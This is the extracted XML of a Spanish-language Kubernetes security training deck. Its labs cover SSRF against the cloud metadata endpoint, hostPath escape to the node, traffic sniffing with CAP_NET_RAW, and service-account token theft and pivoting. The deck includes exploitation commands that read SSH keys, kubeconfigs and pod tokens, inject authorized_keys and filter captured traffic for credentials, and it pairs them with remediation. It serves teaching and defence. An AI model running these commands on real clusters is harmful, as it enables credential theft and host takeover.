         prod:api-sa",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"exp": 1739380800,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"aud": ["https://kubernetes.default"]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40080" y="35387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Vectores de Ataque sobre JWT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5720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457200" y="397764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69080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0467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 directo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54864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un atacante compromete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puede leer el token desde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256032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2560320" y="397764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4069080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90779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Proyected vs Legacy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265176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Los tokens antiguos no expiraban. Los tokens modernos tienen tiempo limitado (TTL).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466344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4663440" y="3977640"/>
            <a:ext cx="192024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406908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01091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en env vars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475488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Copiar el token a variables de entorno lo hace más fácil de robar.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3" name="Shape 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="676656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28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6766560" y="39776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4069080"/>
            <a:ext cx="201168" cy="20116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711403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Reutilización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685800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el token tiene permisos, puede usarse desde fuera del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para acceder al API Server.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8" name="Text 3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 / 30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Laboratorios Prácticos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escenarios de ataque real con explotación y remediación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1344168"/>
            <a:ext cx="786384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40080" y="1344168"/>
            <a:ext cx="54864" cy="77724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914400" y="1481328"/>
            <a:ext cx="502920" cy="5029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1440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087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14884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SSRF &amp; Cloud Metadata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148840" y="170992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Explotación de SSRF para acceder al IMDS (169.254.169.254), robo de credenciales de nodo cloud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40080" y="2304288"/>
            <a:ext cx="786384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0080" y="2304288"/>
            <a:ext cx="54864" cy="7772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914400" y="2441448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9144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46888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14884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hostPath Abuse — Escape al Host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2148840" y="267004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filesystem del host, lectura de secretos del nodo, escritura de SSH keys para acceso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8046720" y="40873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1: SSRF &amp; Acceso a Cloud Metadata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App vulnerable a SSRF que accede al IMDS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24487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041341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Deployment Vulnerable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307951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App vulnerable a SSRF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apps/v1
kind: Deployment
metadata:
  name: ssrf-app
  namespace: lab2-ssrf
spec:
  template:
    spec:
      containers:
        - name: webapp                 # </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="7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vulnerable
          image: python:3.11-slim      # imagen con app python vulnerable
</a:t>
            </a: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# App que hace fetch de URLs
          # sin validación de input
          # ⚠ Sin NetworkPolicy egress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Explotación SSRF → IMDS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Explotar SSRF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SSRF al IMDS de AWS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'http://ssrf-app/fetch?url=\
  http://169.254.169.254/latest/\
  meta-data/iam/security-credentials/'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Obtener credenciales del role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'http://ssrf-app/fetch?url=\
  http://169.254.169.254/.../node-role'
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="7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AccessKeyId, SecretAccessKey, Token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173736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54864" cy="17373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3756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3310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Remediación SSRF &amp; Metadata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85800" y="36576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NetworkPolicy Egress: bloquear tráfico a 169.254.169.254</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/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IMDSv2 en AWS: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token de session para acceder al IMDS (bloquea SSRF simple)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/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Identity (GKE/EKS):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usar las del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Validación de URLs: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confiables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Ips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WAF rules: detectar patrones de SSRF en URLs de input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2: hostPath Abuse — Escape al Host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Pod con hostPath que monta el filesystem del nodo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50545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Pod con hostPath: /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VULNERABLE: hostPath monta /
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
kind: Pod
metadata:
  name: hostpath-pod
  namespace: lab3-hostpath
spec:
  containers:
    - name: attacker                  # </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="6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6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      image: ubuntu:22.04             # Imagen base
      command: ["sleep", "infinity"]
</a:t>
            </a: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volumeMounts:
        - name: host-fs
          mountPath: /host            # </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="60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Montaje</a:t>
            </a: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host
  volumes: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host-fs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hostPath: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path: /              # ⚠ Monta ROOT Host!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type: Directory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4754879" y="1051560"/>
            <a:ext cx="4010297" cy="250545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Cadena de Explotación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Explotar hostPath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Leer credenciales del host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
cat /host/root/.ssh/id_rsa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Leer kubeconfig del nodo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/host/etc/kubernetes/admin.conf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Tokens de OTROS Pods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/host/var/lib/kubelet/pods \
  -name token -exec cat {} \;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Inyectar SSH key para acceso
</a:t>
            </a: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'ssh-rsa AAAA...' &gt;&gt; \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/host/root/.ssh/authorized_keys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3657600"/>
            <a:ext cx="8229600" cy="1463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54864" cy="14630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822192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37993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Impacto: Control Total del Nodo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85800" y="401421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hostPath: / el atacante puede: leer TODOS los secretos del nodo, inyectar backdoors persistentes, acceder a tokens de otros Pods, escribir crontabs maliciosos, instalar SSH keys, y pivotar a otros nodos usando kubeconfig del host. Es equivalente a un root shell en el nodo.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3: Abuso de CAP_NET_RAW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 con capabilities para sniffear tráfico HTTP entre microservicios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51559"/>
            <a:ext cx="3931920" cy="2627267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❌ Pod con Capabilities Peligrosas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Pod con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
kind: Pod
metadata:
  name: sniffer-pod
  namespace: lab1-caps
spec:
  containers:
    - name: sniffer
      image: nicolaka/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netshoot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# ⚠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Contenedor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con tools de red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    command: ["sleep","infinity"]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securityContext:
        capabilities:
          add: ["NET_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RAW","NET_ADMIN"] # ⚠ Capabilities de red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elevadas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    # ⚠ Puede: tcpdump, arpspoof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⚠ Sin NetworkPolicy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09160" y="1051560"/>
            <a:ext cx="3794760" cy="26060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Cadena de Ataque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Sniffing de tráfico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Capturar TODO el tráfico HTTP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port 80 2&gt;/dev/null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Filtrar credenciales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-iE \
  'password|token|auth|cookie|bearer'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Capturar requests a la API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port 8080 | \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grep -A5 'POST /api/login'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42831" y="3771900"/>
            <a:ext cx="8106809" cy="137160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1975" y="3771900"/>
            <a:ext cx="54864" cy="13716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06" y="3905794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27324" y="39547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Impacto: Todo el tráfico HTTP del namespace es visible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72737" y="4136027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 CAP_NET_RAW, el atacante puede capturar credenciales de login, tokens Bearer, API keys, cookies de sesión, datos de usuario (PII), queries a bases de datos, y cualquier otro dato transmitido en HTTP plano entre microservicios. También puede hacer ARP spoofing para redirigir tráfico de Pods vecinos.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18 / 30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4: JWT Token Theft &amp; Pivoting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Robar el token JWT de un Pod y pivotar a otro namespace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199" y="1051559"/>
            <a:ext cx="3977641" cy="2521131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❌ SA con Permisos Cross-Namespace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Pod con SA que tiene permisos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otro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namespace
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v1
kind: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ServiceAccount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Cuenta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servicio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metadata:
  name: cross-ns-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SA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reutilizable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namespace: lab2-jwt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Namespace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origen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
---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rbac.authorization.k8s.io/v1
kind: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ClusterRole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metadata:
  name: secret-reader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Rol leer secrets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rules:
  -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apiGroups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[""]   
    resources: ["secrets"]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Recurso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sensible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verbs: ["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get","list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"]  # ⚠ Todos NS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79" y="1051560"/>
            <a:ext cx="3977641" cy="252113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Token Pivoting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Robar y reutilizar token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Extraer token JWT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TOKEN=$(cat /var/run/secrets/\
  kubernetes.io/serviceaccount/token)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Decodificar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payload JWT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$TOKEN | cut -d. -f2 | base64 -d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Enumerar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permisos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RBAC	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--token=$TOKEN auth can-i --list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4. PIVOTAR: leer secrets de prod!
</a:t>
            </a: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--token=$TOKEN get secrets -n prod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4226" y="3818599"/>
            <a:ext cx="8207394" cy="1278201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04226" y="3847011"/>
            <a:ext cx="45719" cy="129648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29" y="3847011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68987" y="38777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Remediación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846473" y="4073652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1. automountServiceAccountToken: false — no montar token si no es necesario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 Roles (no ClusterRoles) — permisos por namespace, nunca cross-namespace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 Projected tokens con TTL corto — expirationSeconds: 3600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 RBAC Audit — revisar periódicamente qué SA tienen permisos en qué NS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 Token Review API — monitorear uso de tokens y detectar reutilización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 / 30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 de Laboratorios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 → Vector de Ataque → Mitigación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536043"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="457200" y="1051560"/>
          <a:ext cx="8229600" cy="132588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Lab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Vulnerabilidad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Vector de Ataque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Mitigación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26C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con SSRF + sin bloqueo a metadata endpoint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SSRF → 169.254.169.254 → robar credenciales IAM del nodo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NetworkPolicy block IMDS + IMDSv2 + Workload Identity + URL validation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con hostPath: / montando root del host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 /etc/shadow, tokens, kubeconfig → SSH key → root en host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PSA restricted + Kyverno deny hostPath + distroless + non-root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77640"/>
            <a:ext cx="8229600" cy="91440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690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40233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Cada lab incluye: vulnerable YAML + guía de explotación + YAML seguro + script automatizado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05840" y="437083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disponibles en: u5-labs/lab{1,2,3,4}/ — ejecutar con ./guia-labN.sh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 Clave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lecciones de seguridad ofensiva en Kubernetes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05156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45720" cy="10515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1430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11247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metadata endpoint es crítico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349240" y="13990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169.254.169.254 puede entregar credenciales cloud completas. Bloquear con NetworkPolicy y usar Workload Identity.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57200" y="228600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2286000"/>
            <a:ext cx="45720" cy="10515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774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23591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hostPath = acceso al host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51560" y="263347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el filesystem del nodo es equivalente a dar root en la máquina. PSA restricted lo bloquea automáticamente.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 19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57200" y="3520440"/>
            <a:ext cx="45720" cy="105156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11880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156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Automatizar la seguridad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1051560" y="38679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kube-hunter, kubeaudit, Trivy y kube-bench en CI/CD para detectar problemas antes de producción.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754880" y="352044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4754880" y="3520440"/>
            <a:ext cx="4572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11880"/>
            <a:ext cx="292608" cy="29260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34924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Defensa en profundidad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349240" y="38679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control individual es suficiente. Combinar RBAC + PSA + NetworkPolicy + runtime detection + auditoría.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9144000" cy="1691640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="12121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5486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Like an Attacker,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2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 Like a Pro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5 — Completada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&amp; Metadata  •  hostPath Abuse  •  Herramientas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1605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"Conoce los ataques para construir mejores defensas"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22F2BB7616E044ABA9BE1E48A11CC07" ma:contentTypeVersion="18" ma:contentTypeDescription="Crear nuevo documento." ma:contentTypeScope="" ma:versionID="0468aea2944530edfd1b11c0ec301cd9">
  <xsd:schema xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:p="http://schemas.microsoft.com/office/2006/metadata/properties" xmlns:ns1="http://schemas.microsoft.com/sharepoint/v3" xmlns:ns2="67bbcf3e-0180-4939-ab4a-23606c573aa1" xmlns:ns3="94836490-123c-4276-a909-827cb70af95e" targetNamespace="http://schemas.microsoft.com/office/2006/metadata/properties" ma:root="true" ma:fieldsID="cca4cd52219b03770a112f8cb9963f0d" ns1:_="" ns2:_="" ns3:_="">
    <xsd:import namespace="http://schemas.microsoft.com/sharepoint/v3"/>
    <xsd:import namespace="67bbcf3e-0180-4939-ab4a-23606c573aa1"/>
    <xsd:import namespace="94836490-123c-4276-a909-827cb70af95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Propiedades de la Directiva de cumplimiento unificado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Acción de IU de la Directiva de cumplimiento unificado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bbcf3e-0180-4939-ab4a-23606c573aa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Etiquetas de imagen" ma:readOnly="false" ma:fieldId="{5cf76f15-5ced-4ddc-b409-7134ff3c332f}" ma:taxonomyMulti="true" ma:sspId="53a41489-9efd-4705-82fc-442e31f9b69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836490-123c-4276-a909-827cb70af95e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aa232ccf-6a7f-424e-b818-7b30590d5dfa}" ma:internalName="TaxCatchAll" ma:showField="CatchAllData" ma:web="94836490-123c-4276-a909-827cb70af95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4836490-123c-4276-a909-827cb70af95e" xsi:nil="true"/>
    <_ip_UnifiedCompliancePolicyUIAction xmlns="http://schemas.microsoft.com/sharepoint/v3" xsi:nil="true"/>
    <lcf76f155ced4ddcb4097134ff3c332f xmlns="67bbcf3e-0180-4939-ab4a-23606c573aa1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F0159C84-1723-41DA-8B04-3DE9F75D97B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6E58BF-82DB-474B-A069-8CBDD29EDD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7bbcf3e-0180-4939-ab4a-23606c573aa1"/>
    <ds:schemaRef ds:uri="94836490-123c-4276-a909-827cb70af95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C3B6BDB-5C58-4F13-B91E-2DE07DB78382}">
  <ds:schemaRefs>
    <ds:schemaRef ds:uri="http://schemas.microsoft.com/office/2006/metadata/properties"/>
    <ds:schemaRef ds:uri="http://schemas.microsoft.com/office/infopath/2007/PartnerControls"/>
    <ds:schemaRef ds:uri="94836490-123c-4276-a909-827cb70af95e"/>
    <ds:schemaRef ds:uri="http://schemas.microsoft.com/sharepoint/v3"/>
    <ds:schemaRef ds:uri="67bbcf3e-0180-4939-ab4a-23606c573aa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2030</TotalTime>
  <Words>3819</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Presentación en pantalla (16:9)</PresentationFormat>
  <Paragraphs>372</Paragraphs>
  <Slides>19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Consolas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Unidad 5 - Enumeración y Técnicas de Ataque</dc:title>
  <dc:subject>PptxGenJS Presentation</dc:subject>
  <dc:creator>Seguridad Kubernetes</dc:creator>
  <cp:lastModifiedBy>Lucas Zuluaga Perez</cp:lastModifiedBy>
  <cp:revision>26</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-02-11T13:24:54Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-03-10T20:05:56Z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0x010100822F2BB7616E044ABA9BE1E48A11CC07</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="3" name="MSIP_Label_71bdff26-5887-4e5c-8426-6e404c233df0_Enabled">
    <vt:lpwstr>true</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="4" name="MSIP_Label_71bdff26-5887-4e5c-8426-6e404c233df0_SetDate">
    <vt:lpwstr>2026-02-13T13:08:45Z</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="5" name="MSIP_Label_71bdff26-5887-4e5c-8426-6e404c233df0_Method">
    <vt:lpwstr>Standard</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="6" name="MSIP_Label_71bdff26-5887-4e5c-8426-6e404c233df0_Name">
    <vt:lpwstr>71bdff26-5887-4e5c-8426-6e404c233df0</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="7" name="MSIP_Label_71bdff26-5887-4e5c-8426-6e404c233df0_SiteId">
    <vt:lpwstr>b5e244bd-c492-495b-8b10-61bfd453e423</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="8" name="MSIP_Label_71bdff26-5887-4e5c-8426-6e404c233df0_ActionId">
    <vt:lpwstr>71fb9359-20e5-4299-a90a-f7183072d583</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="9" name="MSIP_Label_71bdff26-5887-4e5c-8426-6e404c233df0_ContentBits">
    <vt:lpwstr>0</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="10" name="MSIP_Label_71bdff26-5887-4e5c-8426-6e404c233df0_Tag">
    <vt:lpwstr>10, 3, 0, 2</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="11" name="MediaServiceImageTags">
    <vt:lpwstr/>
  </property>
</Properties>
</file>